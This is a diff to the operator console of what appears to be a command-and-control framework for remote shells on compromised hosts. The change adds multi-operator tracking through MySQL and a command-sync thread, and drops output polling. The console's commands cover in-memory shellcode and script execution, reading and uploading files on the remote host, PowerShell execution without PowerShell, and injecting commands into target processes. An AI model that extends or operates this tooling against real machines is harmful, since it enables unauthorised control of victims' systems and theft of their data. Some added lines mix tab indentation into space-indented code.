@@ -13,6 +13,7 @@ from core.ui import UI
 from core.utils import Utils
 from core.log import Log
 from core.alias import Alias
+from core.sync import start_cmd_sync
 
 class Cli:
 
@@ -26,14 +27,13 @@ class Cli:
         self.cmds["kill"] = self.kill_shell
         self.cmds["purge"] = self.flushdb
         self.cmds["os"] = self.os_shell
-        
+
         self.shell_cmds = {}
         self.shell_cmds["help"] = self.show_help_shell
         self.shell_cmds["fetch"] = self.fetch
         self.shell_cmds["read"] = self.read_file
         self.shell_cmds["upload"] = self.upload_file
         self.shell_cmds["delay"] = self.update_delay
-        self.shell_cmds["refresh"] = self.refresh
         self.shell_cmds["exec"] = self.exec_code
         self.shell_cmds["ps"] = self.ps
         self.shell_cmds["powerless"] = self.powerless
@@ -44,7 +44,7 @@ class Cli:
 
         self.config = config
         self.db = self.config.get("redis")
-
+	self.mysql = self.config.get("mysql")
         self._prompt = "Main"
 
         self.guid = ""
@@ -54,6 +54,8 @@ class Cli:
         self.completer = Completer(self.cmds)
         readline.parse_and_bind("tab: complete")
         readline.set_completer(self.completer.complete)
+
+        start_cmd_sync(config)
 
     def set_prompt(self, prompt):
         self._prompt = prompt
@@ -74,30 +76,30 @@ class Cli:
         if not self.guid == "":
             if cmd == "background":
                 self._prompt = "Main"
+		self.mysql.delete_active_user(self.config.get("uid"), self.guid)
                 self.guid = ""
             
             elif cmd == "exit":
                 UI.error("*** You really want to kill this shell *** (yes/no)")
                 if UI.prompt("Exit").lower() == "yes":
-                    self.db.push_cmd(self.guid, "exit")
+                    self.db.push_cmd(self.guid, "exit", Utils.guid(), self.config.get("username"))
                     self._prompt = "Main"
                     self.guid = ""
             else:
-                Log.log_shell(self.guid, "Sending", data)
+                Log.log_shell(self.guid, "Sending", data, self.config.get("username"))
                 if self.shell_cmds.has_key(cmd):
                     callback = self.shell_cmds[cmd]
                     data = callback(data)
 
                 if not (cmd == "help" or data == ""):
-                    self.db.push_cmd(self.guid, data)
-                    self.get_cmd_output()
+                    self.db.push_cmd(self.guid, data, Utils.guid(), self.config.get("username"))
                 
         # interacting with the main console
         else:
             if self.cmds.has_key(cmd):
                 callback = self.cmds[cmd]
                 callback(data)
-            else:
+            elif not cmd.strip() == "":
                 UI.error("%s is not a valid command" % cmd)
 
     def exit_cli(self, data):
@@ -131,6 +133,7 @@ class Cli:
             readline.set_completer(self.completer.complete)
             readline.parse_and_bind("tab: complete")
             self.guid = guid
+	    self.mysql.add_active_user(self.config.get("uid"), self.guid)
             self._prompt = self.db.get_data("%s:prompt" % guid)
         else:
             UI.error("Invalid session ID")
@@ -214,22 +217,12 @@ class Cli:
         output = subprocess.check_output(cmd, stderr=subprocess.PIPE, shell=True)
         print output
         
-    # shell commands start here
-    def get_cmd_output(self):
-        timestamp = time.time()
-        while int(time.time() - timestamp) < int(self.config.get("max-output-timeout")):
-            output = self.db.get_output(self.guid)
-            if len(output) >= 1:
-                for item in output:
-                    print item
-                break
-
     def show_help_shell(self, data):
         print("\nHelp Menu\n"+"="*9)
         print("\n"+ tabulate({
-            "Commands":["background","refresh","fetch","exec","read","upload","ps","powerless","inject","alias","delay","help"],
+            "Commands":["background","fetch","exec","read","upload","ps","powerless","inject","alias","delay","help"],
             "Args":["","","path/url, cmd","path/url","remote path","path/url, path","","powershell cmd","pid, command","key, value","milliseconds"],
-            "Descriptions":["Return to the main console","Check for previous commands output","In memory execution of a script and execute a command",
+            "Descriptions":["Return to the main console","In memory execution of a script and execute a command",
                             "In memory execution of code (shellcode)","Read a file on the remote host","Upload a file on the remote system",
                             "List processes","Execute Powershell command without invoking Powershell","Inject command into a target process (max length 4096)",
                             "Create an alias to avoid typing the same thing over and over","Update the callback delay","show this help menu"]
@@ -356,11 +349,6 @@ class Cli:
         print "Updating delay to %s" % delay
         return "delay %s" % delay
     
-    def refresh(self, data):
-        for item in self.db.get_output(self.guid):
-            print item
-        return ""
-
     def set_alias(self, data):
         try:
             cmd, key, value = data.split(" ", 2)
